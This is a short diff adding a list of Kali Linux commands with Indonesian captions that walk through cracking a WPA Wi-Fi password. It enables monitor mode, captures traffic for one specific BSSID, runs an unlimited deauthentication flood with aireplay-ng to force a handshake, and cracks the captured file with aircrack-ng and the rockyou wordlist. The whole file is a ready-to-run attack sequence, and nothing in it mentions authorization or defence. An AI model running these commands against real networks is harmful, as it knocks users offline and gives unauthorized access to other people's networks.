@@ -1,0 +1,10 @@
+root@kali:~# airmon-ng
+root@kali:~# airmon-ng start wlan0
+root@kali:~# airodump-ng wlan0mon
+root@kali:~# airodump-ng
+Membuat File Handshake Setelah Nanti Di Dapatkan
+>>root@kali:~# airodump-ng -c 6 --write Wina --bssid 0C:98:38:07:2B:87 wlan0mon
+menghentikan secara paksa untuk mendapatkan handshake
+>>root@kali:~# aireplay-ng -0 0 -a 0C:98:38:07:2B:87 wlan0mon
+proses hacking atau meretas
+root@kali:~# aircrack-ng -w rockyou.txt Wina-01.cap
